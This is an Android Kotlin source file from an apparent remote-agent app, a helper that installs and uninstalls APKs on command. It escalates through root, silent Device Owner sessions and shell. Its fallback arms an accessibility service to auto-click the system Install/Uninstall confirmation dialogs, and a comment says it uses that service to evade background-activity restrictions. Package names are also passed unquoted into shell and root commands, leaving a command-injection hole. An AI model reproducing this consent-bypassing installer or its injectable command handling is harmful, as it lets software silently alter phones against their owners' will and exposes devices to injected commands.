package com.remoteagent

import android.app.PendingIntent
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.util.Log
import androidx.core.content.FileProvider
import java.io.File
import java.io.FileInputStream

data class ApkValidationResult(
    val isValid: Boolean,
    val packageName: String? = null,
    val versionCode: Long? = null,
    val versionName: String? = null,
    val minSdk: Int? = null,
    val errorMessage: String? = null
)

object PackageHelper {
    private const val TAG = "PackageHelper"

    fun isDeviceOwner(context: Context): Boolean {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager ?: return false
        return try {
            dpm.isDeviceOwnerApp(context.packageName)
        } catch (_: Exception) {
            false
        }
    }

    fun isAppInstalled(context: Context, packageName: String): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                context.packageManager.getPackageInfo(packageName, PackageManager.PackageInfoFlags.of(0))
            } else {
                @Suppress("DEPRECATION")
                context.packageManager.getPackageInfo(packageName, 0)
            }
            true
        } catch (_: PackageManager.NameNotFoundException) {
            false
        }
    }

    fun validateApk(context: Context, file: File): ApkValidationResult {
        if (!file.exists()) {
            return ApkValidationResult(false, errorMessage = "File not found at path: ${file.absolutePath}")
        }
        val length = file.length()
        if (length == 0L) {
            return ApkValidationResult(false, errorMessage = "APK file is empty (0 bytes). Download may have failed.")
        }

        // Validate ZIP magic header: standard APKs start with PK\x03\x04 (0x50, 0x4B, 0x03, 0x04)
        try {
            FileInputStream(file).use { input ->
                val header = ByteArray(4)
                val read = input.read(header)
                if (read < 4 || header[0] != 0x50.toByte() || header[1] != 0x4B.toByte() ||
                    header[2] != 0x03.toByte() || header[3] != 0x04.toByte()
                ) {
                    return ApkValidationResult(
                        false,
                        errorMessage = "File is not a valid ZIP/APK archive (corrupted download or HTML error page). Magic header does not match APK format."
                    )
                }
            }
        } catch (e: Exception) {
            return ApkValidationResult(false, errorMessage = "Failed to read APK file header: ${e.message}")
        }

        // Parse package archive info via Android PackageManager
        val packageInfo = try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                context.packageManager.getPackageArchiveInfo(
                    file.absolutePath,
                    PackageManager.PackageInfoFlags.of(0)
                )
            } else {
                @Suppress("DEPRECATION")
                context.packageManager.getPackageArchiveInfo(file.absolutePath, 0)
            }
        } catch (e: Exception) {
            null
        }

        if (packageInfo == null) {
            val isSplitApk = file.name.contains("base.apk", ignoreCase = true) || file.name.contains("split", ignoreCase = true)
            val hint = if (isSplitApk) {
                " This file appears to be a split APK (like base.apk without config splits). Android cannot parse standalone split APKs without their companion splits."
            } else {
                " The APK manifest may be malformed, corrupted, or compiled with an incompatible AAPT2 configuration."
            }
            return ApkValidationResult(
                false,
                errorMessage = "There was a problem parsing the package.$hint"
            )
        }

        val appInfo = packageInfo.applicationInfo
        val minSdk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N && appInfo != null) {
            appInfo.minSdkVersion
        } else {
            1
        }

        if (minSdk > Build.VERSION.SDK_INT) {
            return ApkValidationResult(
                false,
                packageName = packageInfo.packageName,
                minSdk = minSdk,
                errorMessage = "Incompatible APK version (parsing problem): Requires Android API $minSdk (Android ${getAndroidVersionName(minSdk)}), but this device is running API ${Build.VERSION.SDK_INT} (Android ${Build.VERSION.RELEASE})."
            )
        }

        @Suppress("DEPRECATION")
        val versionCode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            packageInfo.longVersionCode
        } else {
            packageInfo.versionCode.toLong()
        }

        return ApkValidationResult(
            isValid = true,
            packageName = packageInfo.packageName,
            versionCode = versionCode,
            versionName = packageInfo.versionName,
            minSdk = minSdk
        )
    }

    fun uninstallPackage(context: Context, packageName: String, rootExecutor: RootExecutor): ExecutionResult {
        Log.i(TAG, "Requesting uninstallation of package: $packageName")

        // 1. Check if package is installed
        if (!isAppInstalled(context, packageName)) {
            return ExecutionResult(
                success = false,
                output = "Package $packageName is not installed on this device."
            )
        }

        // 2. Root pathway (silent & direct)
        if (rootExecutor.isSuAvailable()) {
            val uninsResult = rootExecutor.execute("pm uninstall $packageName")
            val success = uninsResult.success && !uninsResult.output.contains("Failure", ignoreCase = true)
            return ExecutionResult(
                success = success,
                output = if (success) "Uninstalled $packageName directly (via root)" else uninsResult.output.ifBlank { "pm uninstall failed via root" }
            )
        }

        // 3. Device Owner pathway (silent & direct via PackageInstaller, no user prompt)
        if (isDeviceOwner(context)) {
            try {
                val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                val adminComponent = ComponentName(context, AdminReceiver::class.java)
                try {
                    // Ensure the package is not blocked from uninstallation by device policy
                    dpm?.setUninstallBlocked(adminComponent, packageName, false)
                } catch (e: Exception) {
                    Log.w(TAG, "setUninstallBlocked check error: ${e.message}")
                }

                val packageInstaller = context.packageManager.packageInstaller
                val callbackIntent = Intent(context, PackageUninstallReceiver::class.java).apply {
                    action = PackageUninstallReceiver.ACTION_UNINSTALL_STATUS
                    putExtra(PackageInstaller.EXTRA_PACKAGE_NAME, packageName)
                }
                val pendingIntent = PendingIntent.getBroadcast(
                    context,
                    packageName.hashCode(),
                    callbackIntent,
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
                )

                packageInstaller.uninstall(packageName, pendingIntent.intentSender)
                Log.i(TAG, "Committed silent uninstallation for $packageName via Device Owner PackageInstaller")
                return ExecutionResult(
                    success = true,
                    output = "Triggered direct silent uninstallation for $packageName (via Device Owner PackageInstaller, no permission prompt needed)."
                )
            } catch (e: Exception) {
                Log.e(TAG, "Device Owner PackageInstaller.uninstall error: ${e.message}", e)
            }
        }

        // 4. Shell pathway (in case ADB loopback/privileged shell is available)
        val shellRes = executeNonRootShell("pm uninstall $packageName")
        if (shellRes.success && !shellRes.output.contains("Failure", ignoreCase = true) && !shellRes.output.contains("Permission Denial", ignoreCase = true)) {
            return ExecutionResult(
                success = true,
                output = "Uninstalled $packageName directly (via local shell): ${shellRes.output}"
            )
        }

        // 5. Fallback for unprovisioned devices: Launch system uninstaller with Accessibility auto-approval
        return try {
            // Arm AccessibilityService to auto-click "OK" / "Uninstall" on the uninstallation dialog
            DrishtiAccessibilityService.armAutoUninstall(packageName)

            val uninstallIntent = Intent(Intent.ACTION_DELETE).apply {
                data = Uri.parse("package:$packageName")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }

            // Launch activity — prefer AccessibilityService context if available to bypass Android 10+ background activity start restrictions
            val a11y = DrishtiAccessibilityService.instance
            if (a11y != null) {
                a11y.startActivity(uninstallIntent)
            } else {
                context.startActivity(uninstallIntent)
            }

            val a11yNote = if (DrishtiAccessibilityService.isActive) {
                "Accessibility service is active and will auto-confirm the dialog automatically."
            } else {
                "Confirm uninstallation on device screen (or enable Device Owner for 100% silent uninstallation)."
            }

            ExecutionResult(
                success = true,
                output = "Launched uninstaller for $packageName. $a11yNote"
            )
        } catch (e: Exception) {
            ExecutionResult(
                success = false,
                output = "Failed to launch uninstaller: ${e.message}"
            )
        }
    }

    fun installApk(context: Context, rawFile: File, rootExecutor: RootExecutor): ExecutionResult {
        Log.i(TAG, "Requesting installation of APK file: ${rawFile.absolutePath}")

        // 1. Pre-flight validation
        val validation = validateApk(context, rawFile)
        if (!validation.isValid) {
            return ExecutionResult(
                success = false,
                output = validation.errorMessage ?: "APK validation failed (corrupted or incompatible package)."
            )
        }

        // 2. Safely ensure APK is copied into internal cache to eliminate FileProvider & /sdcard permission/parsing errors
        val safeApkFile = ensureCachedApk(context, rawFile)

        // 3. Root pathway (silent & direct)
        if (rootExecutor.isSuAvailable()) {
            val installResult = rootExecutor.execute("pm install -r -g \"${safeApkFile.absolutePath}\"")
            val success = installResult.success && !installResult.output.contains("Failure", ignoreCase = true)
            return ExecutionResult(
                success = success,
                output = if (success) "Installed package ${validation.packageName ?: safeApkFile.name} directly (via root)" else installResult.output.ifBlank { "pm install failed via root" }
            )
        }

        // 4. Device Owner pathway (silent & direct PackageInstaller Session, no user prompt)
        if (isDeviceOwner(context)) {
            var session: PackageInstaller.Session? = null
            try {
                val packageInstaller = context.packageManager.packageInstaller
                val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL).apply {
                    if (validation.packageName != null) {
                        setAppPackageName(validation.packageName)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
                    }
                }

                val sessionId = packageInstaller.createSession(params)
                session = packageInstaller.openSession(sessionId)

                safeApkFile.inputStream().use { input ->
                    session.openWrite("package_install", 0, safeApkFile.length()).use { out ->
                        input.copyTo(out)
                        session.fsync(out)
                    }
                }

                val callbackIntent = Intent(context, PackageInstallReceiver::class.java).apply {
                    action = PackageInstallReceiver.ACTION_INSTALL_STATUS
                    putExtra(PackageInstaller.EXTRA_PACKAGE_NAME, validation.packageName ?: safeApkFile.name)
                }
                val pendingIntent = PendingIntent.getBroadcast(
                    context,
                    sessionId,
                    callbackIntent,
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
                )

                session.commit(pendingIntent.intentSender)
                Log.i(TAG, "Committed silent install session ($sessionId) for ${validation.packageName}")

                return ExecutionResult(
                    success = true,
                    output = "Committed direct silent installation for ${validation.packageName ?: safeApkFile.name} (via Device Owner PackageInstaller, no prompt required)."
                )
            } catch (e: Exception) {
                Log.e(TAG, "Device Owner PackageInstaller session error: ${e.message}", e)
            } finally {
                try {
                    session?.close()
                } catch (_: Exception) {}
            }
        }

        // 5. Fallback for unprovisioned devices: FileProvider with Accessibility auto-approval
        return try {
            // Arm AccessibilityService to auto-click "Install" / "Update" on the installer dialog
            DrishtiAccessibilityService.armAutoInstall()

            val contentUri = FileProvider.getUriForFile(
                context,
                "${context.packageName}.fileprovider",
                safeApkFile
            )

            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(contentUri, "application/vnd.android.package-archive")
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }

            val a11y = DrishtiAccessibilityService.instance
            if (a11y != null) {
                a11y.startActivity(intent)
            } else {
                context.startActivity(intent)
            }

            val a11yNote = if (DrishtiAccessibilityService.isActive) {
                "Accessibility service is active and will auto-confirm the dialog automatically."
            } else {
                "Confirm installation on device screen (or enable Device Owner for 100% silent unassisted installation)."
            }

            ExecutionResult(
                success = true,
                output = "Launched package installer for ${safeApkFile.name} (package: ${validation.packageName}). $a11yNote"
            )
        } catch (e: Exception) {
            ExecutionResult(
                success = false,
                output = "Failed to launch package installer for ${rawFile.absolutePath}: ${e.message}"
            )
        }
    }

    private fun ensureCachedApk(context: Context, rawFile: File): File {
        // If file is already in app cache/files dir, use directly
        if (rawFile.absolutePath.startsWith(context.cacheDir.absolutePath) ||
            rawFile.absolutePath.startsWith(context.filesDir.absolutePath)
        ) {
            return rawFile
        }

        val cacheFolder = File(context.cacheDir, "apk-downloads").apply { mkdirs() }
        val target = File(cacheFolder, rawFile.name)
        try {
            rawFile.copyTo(target, overwrite = true)
            return target
        } catch (e: Exception) {
            Log.w(TAG, "Could not copy APK to cache, using original: ${e.message}")
            return rawFile
        }
    }

    private fun executeNonRootShell(command: String): ExecutionResult {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
            val stdout = process.inputStream.bufferedReader().use { it.readText() }
            val stderr = process.errorStream.bufferedReader().use { it.readText() }
            val exitCode = process.waitFor()

            val combined = (stdout.trim() + if (stderr.isNotBlank()) " " + stderr.trim() else "").trim()
            ExecutionResult(success = exitCode == 0, output = combined)
        } catch (e: Exception) {
            ExecutionResult(success = false, output = e.message ?: "Shell error")
        }
    }

    private fun getAndroidVersionName(apiLevel: Int): String {
        return when (apiLevel) {
            35 -> "15 (Vanilla Ice Cream)"
            34 -> "14 (Upside Down Cake)"
            33 -> "13 (Tiramisu)"
            32 -> "12L (Sv2)"
            31 -> "12 (Snow Cone)"
            30 -> "11 (Red Velvet Cake)"
            29 -> "10 (Quince Tart)"
            28 -> "9.0 (Pie)"
            27 -> "8.1 (Oreo)"
            26 -> "8.0 (Oreo)"
            25 -> "7.1 (Nougat)"
            24 -> "7.0 (Nougat)"
            else -> "$apiLevel"
        }
    }
}
